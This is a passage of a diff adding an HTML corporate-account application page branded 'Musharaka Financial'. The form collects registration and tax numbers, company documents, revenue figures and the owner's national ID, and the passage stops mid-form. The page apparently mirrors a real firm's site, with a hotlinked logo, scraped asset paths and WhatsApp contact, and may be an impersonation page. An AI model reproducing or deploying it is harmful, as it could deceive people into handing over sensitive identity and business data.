@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Open Corporate Account | Musharaka Financial</title>
+  <link rel="icon" href="../wp-content/uploads/2025/03/faviconV2.png" sizes="32x32">
+  <link rel="stylesheet" href="../wp-content/litespeed/css/a0062117fd9d72362afee7da555070cd.css">
+
+  <style>
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-light.woff2') format('woff2');
+      font-weight: 300; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-regular.woff2') format('woff2');
+      font-weight: 400; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-medium.woff2') format('woff2');
+      font-weight: 500; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-bold.woff2') format('woff2');
+      font-weight: 700; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-extrabold.woff2') format('woff2');
+      font-weight: 800; font-display: swap;
+    }
+  </style>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --gold:       #b5985a;
+      --gold-light: #eed3a6;
+      --gold-dark:  #8c7340;
+      --dark:       #1a1a1a;
+      --dark-2:     #231f20;
+      --bg:         #f5f0e8;
+      --white:      #ffffff;
+      --muted:      #6c6c6c;
+      --border:     #ddd0b8;
+      --error:      #c0392b;
+      --success:    #1e8449;
+      --blue:       #2980b9;
+    }
+
+    html, body { height: 100%; font-family: 'Tajawal', sans-serif; background: var(--dark-2); color: var(--dark); direction: ltr; }
+
+    /* LAYOUT */
+    .page-wrapper { display: flex; min-height: 100vh; }
+
+    /* ASIDE */
+    .aside {
+      flex: 0 0 42%; position: sticky; top: 0; height: 100vh;
+      background: var(--dark-2) center/cover no-repeat;
+      display: flex; flex-direction: column; align-items: center;
+      justify-content: space-between; padding: 40px 30px; overflow: hidden;
+    }
+    .aside::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(160deg, rgba(26,26,26,.9) 0%, rgba(26,26,26,.65) 50%, rgba(181,152,90,.25) 100%);
+    }
+    .aside > * { position: relative; z-index: 1; }
+    .aside-logo img { max-height: 80px; filter: brightness(1.1); }
+    .aside-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 6px 16px; border-radius: 100px;
+      background: rgba(181,152,90,.2); border: 1px solid rgba(181,152,90,.4);
+      color: var(--gold-light); font-size: .82rem; font-weight: 600;
+      margin-bottom: 14px;
+    }
+    .aside-text { text-align: center; color: var(--white); }
+    .aside-text h2 { font-size: 2rem; font-weight: 800; color: var(--gold-light); line-height: 1.4; margin-bottom: 14px; }
+    .aside-text p  { font-size: 1rem; font-weight: 300; color: rgba(255,255,255,.75); line-height: 1.8; max-width: 320px; margin: 0 auto; }
+    .aside-features { display: flex; flex-direction: column; gap: 10px; width: 100%; }
+    .aside-feature  { display: flex; align-items: center; gap: 10px; color: rgba(255,255,255,.8); font-size: .88rem; }
+    .aside-feature-icon {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: rgba(181,152,90,.2); display: flex; align-items: center;
+      justify-content: center; font-size: 1rem; flex-shrink: 0;
+    }
+    .aside-footer { text-align: center; color: rgba(255,255,255,.4); font-size: .78rem; }
+    .aside-footer p + p { margin-top: 6px; }
+
+    .aside-contact { display: flex; justify-content: center; gap: 12px; margin-bottom: 16px; }
+    .aside-contact a {
+      display: flex; align-items: center; gap: 6px;
+      background: rgba(255,255,255,0.12); color: #fff; text-decoration: none;
+      padding: 8px 16px; border-radius: 8px; font-size: .88rem; font-weight: 500;
+      transition: background .2s;
+    }
+    .aside-contact a:hover { background: rgba(255,255,255,0.22); }
+    .aside-contact a.wa { background: rgba(37,211,102,0.25); }
+    .aside-contact a.wa:hover { background: rgba(37,211,102,0.4); }
+
+    .float-contact { display: none; position: fixed; bottom: 20px; right: 20px; z-index: 999; flex-direction: column; gap: 10px; }
+    .float-contact a {
+      width: 48px; height: 48px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-size: 1.3rem; text-decoration: none;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.25);
+    }
+    .float-contact a.wa  { background: #25d366; }
+    .float-contact a.tel { background: var(--gold); }
+    @media (max-width: 768px) { .float-contact { display: flex; } }
+
+    /* FORM SIDE */
+    .form-side { flex: 1; background: var(--bg); overflow-y: auto; display: flex; flex-direction: column; }
+    .form-container { max-width: 720px; width: 100%; margin: 0 auto; padding: 50px 40px 70px; }
+
+    /* HEADER */
+    .form-header { margin-bottom: 32px; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: 6px;
+      color: var(--gold); text-decoration: none; font-size: .9rem;
+      font-weight: 500; margin-bottom: 20px; transition: opacity .2s;
+    }
+    .back-link:hover { opacity: .75; }
+    .form-header h1 { font-size: 1.8rem; font-weight: 800; color: var(--dark); line-height: 1.3; }
+    .form-header p  { margin-top: 8px; color: var(--muted); font-size: .95rem; }
+
+    /* PROGRESS */
+    .progress-steps { display: flex; gap: 6px; margin-bottom: 36px; }
+    .step-bar { height: 4px; flex: 1; border-radius: 100px; background: var(--border); }
+    .step-bar.active { background: var(--gold); }
+
+    /* SECTION */
+    .section-title {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 18px; margin-top: 34px;
+    }
+    .section-title:first-of-type { margin-top: 0; }
+    .section-number {
+      width: 32px; height: 32px; border-radius: 50%; background: var(--gold);
+      color: var(--white); font-size: .85rem; font-weight: 700;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .section-title h2 { font-size: 1.05rem; font-weight: 700; color: var(--dark); flex: 1; }
+    .section-line  { flex: 1; height: 1px; background: var(--border); }
+
+    /* GRID */
+    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .form-grid .full { grid-column: 1 / -1; }
+    .form-group { display: flex; flex-direction: column; gap: 6px; }
+
+    label { font-size: .85rem; font-weight: 600; color: var(--dark); }
+    label .req { color: var(--gold); margin-left: 2px; }
+    label .opt { font-weight: 400; color: var(--muted); font-size: .78rem; }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"],
+    input[type="email"],
+    input[type="date"],
+    input[type="url"],
+    select,
+    textarea {
+      width: 100%; padding: 12px 14px;
+      border: 1.5px solid var(--border); border-radius: 10px;
+      background: var(--white); font-family: 'Tajawal', sans-serif;
+      font-size: .95rem; color: var(--dark); outline: none;
+      transition: border-color .2s, box-shadow .2s; direction: ltr;
+    }
+    input:focus, select:focus, textarea:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    input.error, select.error, textarea.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(192,57,43,.10);
+    }
+    .err { font-size: .78rem; color: var(--error); display: none; }
+    input.error ~ .err, select.error ~ .err, textarea.error ~ .err { display: block; }
+
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23b5985a' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat; background-position: right 14px center; padding-right: 40px;
+    }
+    textarea { resize: vertical; min-height: 100px; }
+
+    /* FILE UPLOAD */
+    .file-upload {
+      display: flex; flex-direction: column; gap: 0;
+    }
+    .file-box {
+      display: flex; align-items: center; gap: 0;
+      border: 1.5px solid var(--border); border-radius: 10px;
+      overflow: hidden; background: var(--white);
+      transition: border-color .2s, box-shadow .2s;
+    }
+    .file-box:focus-within {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    .file-box.error { border-color: var(--error); }
+    .file-trigger {
+      padding: 11px 16px; background: var(--gold); color: var(--white);
+      font-family: 'Tajawal', sans-serif; font-size: .85rem; font-weight: 600;
+      cursor: pointer; white-space: nowrap; flex-shrink: 0;
+      transition: background .2s; border: none; outline: none;
+    }
+    .file-trigger:hover { background: var(--gold-dark); }
+    .file-name {
+      flex: 1; padding: 0 12px; font-size: .88rem; color: var(--muted);
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    input[type="file"] { display: none; }
+    .file-hint { font-size: .75rem; color: var(--muted); margin-top: 4px; }
+
+    /* OWNER CARD */
+    .owner-card {
+      border: 1.5px solid var(--border); border-radius: 14px;
+      background: var(--white); overflow: hidden;
+    }
+    .owner-card-header {
+      padding: 14px 18px; background: rgba(181,152,90,.06);
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; gap: 10px;
+    }
+    .owner-card-header span { font-weight: 700; font-size: .95rem; color: var(--dark); }
+    .owner-icon {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: rgba(181,152,90,.15); display: flex; align-items: center;
+      justify-content: center; font-size: 1rem; flex-shrink: 0;
+    }
+    .owner-card-body { padding: 18px; }
+    .owner-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .owner-grid .full { grid-column: 1 / -1; }
+
+    /* OFFER CARDS */
+    .offer-cards { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .offer-card { position: relative; cursor: pointer; }
+    .offer-card input[type="radio"] { position: absolute; opacity: 0; width: 0; height: 0; }
+    .offer-card-label {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+      padding: 16px 12px; border: 2px solid var(--border); border-radius: 12px;
+      background: var(--white); cursor: pointer; transition: all .2s; text-align: center; width: 100%;
+    }
+    .offer-card-label:hover { border-color: var(--gold-light); background: rgba(238,211,166,.15); }
+    .offer-card input:checked + .offer-card-label {
+      border-color: var(--gold); background: rgba(181,152,90,.08);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    .oc-icon { font-size: 1.8rem; line-height: 1; }
+    .oc-name { font-size: .85rem; font-weight: 700; color: var(--dark); }
+    .oc-desc { font-size: .75rem; color: var(--muted); line-height: 1.4; }
+
+    /* SUBMIT */
+    .submit-section { margin-top: 36px; display: flex; flex-direction: column; gap: 14px; }
+    .btn-submit {
+      width: 100%; padding: 15px 24px; background: var(--gold); color: var(--white);
+      border: none; border-radius: 12px; font-family: 'Tajawal', sans-serif;
+      font-size: 1.05rem; font-weight: 700; cursor: pointer; transition: all .25s;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .btn-submit:hover { background: var(--gold-dark); transform: translateY(-1px); box-shadow: 0 6px 20px rgba(181,152,90,.35); }
+    .btn-submit:active { transform: translateY(0); }
+    .btn-submit.loading { opacity: .75; pointer-events: none; }
+    .spinner {
+      display: none; width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,.35); border-top-color: #fff;
+      border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0;
+    }
+    .btn-submit.loading .spinner  { display: block; }
+    .btn-submit.loading .btn-icon { display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .terms-note { text-align: center; font-size: .8rem; color: var(--muted); line-height: 1.7; }
+    .terms-note a { color: var(--gold); text-decoration: none; }
+
+    /* SUCCESS */
+    .success-overlay {
+      display: none; position: fixed; inset: 0;
+      background: rgba(26,26,26,.78); z-index: 999;
+      align-items: center; justify-content: center;
+    }
+    .success-overlay.show { display: flex; }
+    .success-card {
+      background: var(--white); border-radius: 20px; padding: 50px 40px;
+      text-align: center; max-width: 440px; width: 90%; animation: popIn .35s ease;
+    }
+    @keyframes popIn { from { transform: scale(.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .success-icon {
+      width: 72px; height: 72px; background: rgba(30,132,73,.1); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
+      color: var(--success);
+    }
+    .success-card h2 { font-size: 1.4rem; font-weight: 800; color: var(--dark); margin-bottom: 10px; }
+    .success-card p  { color: var(--muted); font-size: .95rem; line-height: 1.8; margin-bottom: 28px; }
+    .btn-home {
+      display: inline-block; padding: 12px 32px; background: var(--gold);
+      color: var(--white); border-radius: 10px; text-decoration: none;
+      font-weight: 700; font-size: .95rem; transition: background .2s;
+    }
+    .btn-home:hover { background: var(--gold-dark); }
+
+    /* TOAST */
+    .toast-error {
+      display: none; position: fixed; bottom: 28px; left: 50%;
+      transform: translateX(-50%); background: #c0392b; color: #fff;
+      padding: 12px 24px; border-radius: 10px; font-size: .9rem; font-weight: 600;
+      z-index: 9999; box-shadow: 0 4px 20px rgba(0,0,0,.2);
+      white-space: nowrap; animation: fadeUp .3s ease;
+    }
+    .toast-error.show { display: block; }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+      to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    /* NUMBER NO ARROWS */
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; }
+    input[type=number] { -moz-appearance: textfield; }
+
+    ::placeholder { color: #bbb; font-size: .9rem; }
+
+    /* RESPONSIVE */
+    @media (max-width: 900px) {
+      .aside { display: none; }
+      .form-container { padding: 32px 24px 50px; }
+    }
+    @media (max-width: 600px) {
+      .form-grid, .owner-grid { grid-template-columns: 1fr; }
+      .form-grid .full, .owner-grid .full { grid-column: 1; }
+      .offer-cards { grid-template-columns: 1fr 1fr; }
+      .form-header h1 { font-size: 1.5rem; }
+    }
+    @media (max-width: 420px) {
+      .offer-cards { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+
+<body>
+
+<!-- Toast -->
+<div class="toast-error" id="toastError"></div>
+
+<!-- Success -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-card">
+    <div class="success-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" viewBox="0 0 16 16">
+        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+      </svg>
+    </div>
+    <h2>Thank You! 🎉</h2>
+    <p>
+      Your corporate account request has been received successfully.<br>
+      <strong>Our team will contact you to complete the company registration with Musharaka Financial.</strong><br><br>
+      We appreciate your trust and our dedicated team will be in touch with you shortly.
+    </p>
+    <a href="index.htm" class="btn-home">Back to Home</a>
+  </div>
+</div>
+
+<!-- PAGE -->
+<div class="page-wrapper">
+
+  <!-- ASIDE -->
+  <aside class="aside">
+    <div class="aside-logo">
+      <a href="index.htm">
+        <img src="https://musharaka.sa/wp-content/uploads/2025/04/ad0dd98ee54f5c1cc0ad82aed29e0605.png"
+             onerror="this.style.display='none'" alt="Musharaka Financial">
+      </a>
+    </div>
+
+    <div class="aside-text">
+      <div class="aside-badge">🏢 Corporate Accounts</div>
+      <h2>Institutional &amp; Corporate Investments</h2>
+      <p>Integrated investment solutions designed specifically for companies and commercial institutions in the Saudi market.</p>
+    </div>
+
+    <div class="aside-features">
+      <div class="aside-feature">
+        <div class="aside-feature-icon">🛡️</div>
+        <span>Full Legal Protection for Institutional Assets</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">📊</div>
+        <span>Detailed Periodic Reports for Shareholders</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">👥</div>
+        <span>Dedicated Investment Advisor for Your Entity</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">⚡</div>
+        <span>Fast Processing for Institutional Requests</span>
+      </div>
+    </div>
+
+    <div class="aside-contact">
+      <a href="https://wa.me/966582062882" class="wa" target="_blank" title="WhatsApp">
+        <i class="fa-brands fa-whatsapp" aria-hidden="true"></i> WhatsApp
+      </a>
+      <a href="tel:+966582062882" class="tel" title="Phone Call">
+        <i class="fa-solid fa-phone-volume" aria-hidden="true"></i> Call
+      </a>
+    </div>
+    <div class="aside-footer">
+      <p>Licensed by the Capital Market Authority &middot; License No. 27-13169</p>
+      <p>&copy; 2025 Musharaka Financial. All rights reserved.</p>
+    </div>
+  </aside>
+
+  <!-- floating contact buttons (mobile) -->
+  <div class="float-contact">
+    <a href="https://wa.me/966582062882" class="wa" target="_blank" title="WhatsApp">
+      <i class="fa-brands fa-whatsapp" aria-hidden="true"></i>
+      <span class="sr-only">WhatsApp</span>
+    </a>
+    <a href="tel:+966582062882" class="tel" title="Phone Call">
+      <i class="fa-solid fa-phone-volume" aria-hidden="true"></i>
+      <span class="sr-only">Phone Call</span>
+    </a>
+  </div>
+
+  <!-- FORM SIDE -->
+  <main class="form-side">
+    <div class="form-container">
+
+      <div class="form-header">
+        <a href="index.htm" class="back-link">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"/>
+          </svg>
+          Back to Home
+        </a>
+        <h1>Open Corporate Account</h1>
+        <p>Complete the entity information below and our dedicated team will contact you as soon as possible</p>
+      </div>
+
+      <div class="progress-steps">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+      </div>
+
+      <form id="entityForm" novalidate>
+
+        <!-- SECTION 1: Company / Entity Data -->
+        <div class="section-title">
+          <div class="section-number">1</div>
+          <h2>Company / Entity Data</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group full">
+            <label for="companyName">Company / Entity Name <span class="req">*</span></label>
+            <input type="text" id="companyName" name="companyName"
+                   placeholder="Enter the official name as in the commercial registration" required>
+            <span class="err">This field is required</span>
+          </div>
+
+          <div class="form-group">
+            <label for="entityType">Entity Type <span class="req">*</span></label>
+            <select id="entityType" name="entityType" required>
+              <option value="" disabled selected>Select entity type</option>
+              <option value="company_limited">Limited Liability Company (LLC)</option>
+              <option value="joint_stock">Joint Stock Company</option>
+              <option value="sole_prop">Sole Proprietorship</option>
+              <option value="partnership">Partnership</option>
+              <option value="holding">Holding Company</option>
+              <option value="foreign_branch">Foreign Company Branch</option>
+              <option value="ngo">Association / Non-Profit Organization</option>
+              <option value="other">Other</option>
+            </select>
+            <span class="err">Please select the entity type</span>
+          </div>
+
+          <div class="form-group">
+            <label for="crNumber">Commercial Registration Number <span class="req">*</span></label>
+            <input type="text" id="crNumber" name="crNumber"
+                   placeholder="10 digits" maxlength="10" required>
+            <span class="err">Enter a valid commercial registration number</span>
+          </div>
+
+          <div class="form-group">
+            <label for="crExpiry">CR Expiry Date <span class="req">*</span></label>
+            <input type="date" id="crExpiry" name="crExpiry" required>
+            <span class="err">Enter the CR expiry date</span>
+          </div>
+
+          <div class="form-group">
+            <label for="taxNumber">Tax Number <span class="req">*</span></label>
+            <input type="text" id="taxNumber" name="taxNumber"
+                   placeholder="15 digits" maxlength="15" required>
+            <span class="err">Enter the tax number</span>
+          </div>
+
+          <div class="form-group">
+            <label for="foundYear">Year of Establishment <span class="req">*</span></label>
+            <input type="number" id="foundYear" name="foundYear"
+                   placeholder="e.g. 2010" min="1900" max="2025" required>
+            <span class="err">Enter a valid establishment year</span>
+          </div>
+
+          <div class="form-group">
+            <label for="country">Country of Registration <span class="req">*</span></label>
+            <select id="country" name="country" required>
+              <option value="" disabled selected>Select country</option>
+              <option value="SA" selected>Saudi Arabia</option>
+              <option value="AE">United Arab Emirates</option>
+              <option value="KW">Kuwait</option>
+              <option value="QA">Qatar</option>
+              <option value="BH">Bahrain</option>
+              <option value="OM">Oman</option>
+              <option value="EG">Egypt</option>
+              <option value="JO">Jordan</option>
+              <option value="US">United States</option>
+              <option value="GB">United Kingdom</option>
+              <option value="OTHER">Other</option>
+            </select>
+            <span class="err">Please select the country</span>
+          </div>
+
+          <div class="form-group">
+            <label for="city">City <span class="req">*</span></label>
+            <input type="text" id="city" name="city" placeholder="City name" required>
+            <span class="err">Enter the city</span>
+          </div>
+
+          <div class="form-group full">
+            <label for="address">Detailed Address <span class="req">*</span></label>
+            <input type="text" id="address" name="address"
+                   placeholder="Street, District, Building / Office Number" required>
+            <span class="err">Enter the address</span>
+          </div>
+
+        </div>
+
+        <!-- SECTION 2: Commercial License & Documents -->
+        <div class="section-title">
+          <div class="section-number">2</div>
+          <h2>Commercial License &amp; Official Documents</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group">
+            <label for="licenseNumber">Commercial License Number <span class="req">*</span></label>
+            <input type="text" id="licenseNumber" name="licenseNumber"
+                   placeholder="Enter license number" required>
+            <span class="err">Enter the commercial license number</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseExpiry">License Expiry Date <span class="req">*</span></label>
+            <input type="date" id="licenseExpiry" name="licenseExpiry" required>
+            <span class="err">Enter the license expiry date</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseAuthority">Issuing Authority <span class="req">*</span></label>
+            <select id="licenseAuthority" name="licenseAuthority" required>
+              <option value="" disabled selected>Select authority</option>
+              <option value="mci">Ministry of Commerce</option>
+              <option value="momra">Ministry of Municipal Affairs</option>
+              <option value="sama">Saudi Central Bank (SAMA)</option>
+              <option value="cma">Capital Market Authority (CMA)</option>
+              <option value="moh">Ministry of Health</option>
+              <option value="moe">Ministry of Education</option>
+              <option value="other">Other Authority</option>
+            </select>
+            <span class="err">Select the issuing authority</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseActivity">Primary Business Activity <span class="req">*</span></label>
+            <input type="text" id="licenseActivity" name="licenseActivity"
+                   placeholder="e.g. Financial investment, Real estate development" required>
+            <span class="err">Enter the business activity</span>
+          </div>
+
+          <!-- CR Document -->
+          <div class="form-group full file-upload">
+            <label>Commercial Registration Document <span class="req">*</span></label>
+            <div class="file-box" id="crFileBox">
+              <button type="button" class="file-trigger" onclick="document.getElementById('crFile').click()">
+                &#128206; Choose File
+              </button>
+              <span class="file-name" id="crFileName">No file chosen</span>
+              <input type="file" id="crFile" name="crFile" accept=".pdf,.jpg,.jpeg,.png">
+            </div>
+            <span class="file-hint">PDF or image &middot; Max 5 MB</span>
+            <span class="err" id="crFileErr">Please upload the commercial registration document</span>
+          </div>
+
+          <!-- License Document -->
+          <div class="form-group full file-upload">
+            <label>Commercial License Document <span class="opt">(Optional)</span></label>
+            <div class="file-box" id="licFileBox">
+              <button type="button" class="file-trigger" onclick="document.getElementById('licFile').click()">
+                &#128206; Choose File
+              </button>
+              <span class="file-name" id="licFileName">No file chosen</span>
+              <input type="file" id="licFile" name="licFile" accept=".pdf,.jpg,.jpeg,.png">
+            </div>
+            <span class="file-hint">PDF or image &middot; Max 5 MB</span>
+          </div>
+
+        </div>
+
+        <!-- SECTION 3: Commercial & Financial Data -->
+        <div class="section-title">
+          <div class="section-number">3</div>
+          <h2>Commercial &amp; Financial Data</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group">
+            <label for="companyPhone">Company Phone <span class="req">*</span></label>
+            <input type="tel" id="companyPhone" name="companyPhone"
+                   placeholder="+966XXXXXXXXX" required>
+            <span class="err">Enter the company phone number</span>
+          </div>
+
+          <div class="form-group">
+            <label for="companyEmail">Official Email Address <span class="req">*</span></label>
+            <input type="email" id="companyEmail" name="companyEmail"
+                   placeholder="info@company.com" required>
+            <span class="err">Enter a valid email address</span>
+          </div>
+
+          <div class="form-group">
+            <label for="website">Website <span class="opt">(Optional)</span></label>
+            <input type="url" id="website" name="website" placeholder="https://www.company.com">
+          </div>
+
+          <div class="form-group">
+            <label for="employeeCount">Number of Employees <span class="req">*</span></label>
+            <select id="employeeCount" name="employeeCount" required>
+              <option value="" disabled selected>Select range</option>
+              <option value="1-9">1 &ndash; 9 employees (Micro)</option>
+              <option value="10-49">10 &ndash; 49 employees (Small)</option>
+              <option value="50-249">50 &ndash; 249 employees (Medium)</option>
+              <option value="250+">250 or more employees (Large)</option>
+            </select>
+            <span class="err">Select the employee count range</span>
+          </div>
+
+          <div class="form-group">
+            <label for="annualRevenue">Annual Revenue (Approximate) <span class="req">*</span></label>
+            <select id="annualRevenue" name="annualRevenue" required>
+              <option value="" disabled selected>Select range</option>
+              <option value="under1m">Less than 1M SAR</option>
+              <option value="1m-5m">1M &ndash; 5M SAR</option>
+              <option value="5m-20m">5M &ndash; 20M SAR</option>
+              <option value="20m-100m">20M &ndash; 100M SAR</option>
+              <option value="over100m">More than 100M SAR</option>
+            </select>
+            <span class="err">Select the revenue range</span>
+          </div>
+
+          <div class="form-group">
+            <label for="capitalAmount">Investment Capital Amount (SAR) <span class="req">*</span></label>
+            <input type="number" id="capitalAmount" name="capitalAmount"
+                   placeholder="Enter amount" min="50000" required>
+            <span class="err" id="capitalErr">Minimum institutional investment is 50,000 SAR</span>
+          </div>
+
+          <!-- Service Type -->
+          <div class="form-group full">
+            <label>Required Service Type <span class="req">*</span></label>
+            <div class="offer-cards" id="offerCards">
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="portfolio_mgmt">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#128188;</span>
+                  <span class="oc-name">Portfolio Management</span>
+                  <span class="oc-desc">Professional management of institutional assets</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="reits">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#127959;&#65039;</span>
+                  <span class="oc-name">Real Estate Investment Funds</span>
+                  <span class="oc-desc">Diversified real estate investment</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="investment_banking">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#127974;</span>
+                  <span class="oc-name">Investment Banking</span>
+                  <span class="oc-desc">Merger &amp; acquisition advisory</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="brokerage">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#128202;</span>
+                  <span class="oc-name">Securities Brokerage</span>
+                  <span class="oc-desc">Stocks and bonds trading</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="ipo_mgmt">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#127919;</span>
+                  <span class="oc-name">IPO Management</span>
+                  <span class="oc-desc">Arranging and managing public offerings</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="custody">
+                <span class="offer-card-label">
+                  <span class="oc-icon">&#128272;</span>
+                  <span class="oc-name">Custody Services</span>
+                  <span class="oc-desc">Safekeeping and management of securities</span>
+                </span>
+              </label>
+
+            </div>
+            <span class="err" id="offerErr">Please select the required service type</span>
+          </div>
+
+        </div>
+
+        <!-- SECTION 4: Owner / Authorized Representative Data -->
+        <div class="section-title">
+          <div class="section-number">4</div>
+          <h2>Owner / Authorized Representative Data</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="owner-card">
+          <div class="owner-card-header">
+            <div class="owner-icon">&#128100;</div>
+            <span>Primary Account Responsible</span>
+          </div>
+          <div class="owner-card-body">
+            <div class="owner-grid">
+
+              <div class="form-group">
+                <label for="ownerFirst">First Name <span class="req">*</span></label>
+                <input type="text" id="ownerFirst" name="ownerFirst" placeholder="First name" required>
+                <span class="err">Required</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerSecond">Middle Name <span class="req">*</span></label>
+                <input type="text" id="ownerSecond" name="ownerSecond" placeholder="Middle name" required>
+                <span class="err">Required</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerThird">Last Name <span class="req">*</span></label>
+                <input type="text" id="ownerThird" name="ownerThird" placeholder="Last name" required>
+                <span class="err">Required</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerTitle">Job Title <span class="req">*</span></label>
+                <select id="ownerTitle" name="ownerTitle" required>
+                  <option value="" disabled selected>Select title</option>
+                  <option value="owner">Owner / Entity Proprietor</option>
+                  <option value="ceo">Chief Executive Officer (CEO)</option>
+                  <option value="chairman">Chairman of the Board</option>
+                  <option value="gm">General Manager</option>
+                  <option value="cfo">Chief Financial Officer (CFO)</option>
+                  <option value="authorized">Authorized Signatory</option>
+                </select>
+                <span class="err">Select the job title</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerNational">National ID / Iqama Number <span class="req">*</span></label>
+                <input type="text" id="ownerNational" name="ownerNational"
+                       placeholder="10 digits" maxlength="10" required>
+                <span class="err">Enter the ID number</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerNationality">Nationality <span class="req">*</span></label>
+                <select id="ownerNationality" name="ownerNationality" required>
+                  <option value="" disabled selected>Select nationality</option>
+                  <option value="SA">Saudi</option>
+                  <option value="AE">Emirati</option>
+                  <option value="KW">Kuwaiti</option>
+                  <option value="QA">Qatari</option>
+                  <option value="BH">Bahraini</option>
+                  <option value="OM">Omani</option>
+                  <option value="EG">Egyptian</option>
+                  <option value="JO">Jordanian</option>
+                  <option value="OTHER">Other</option>
+                </select>
+                <span class="err">Select nationality</span>
+              </div>
+
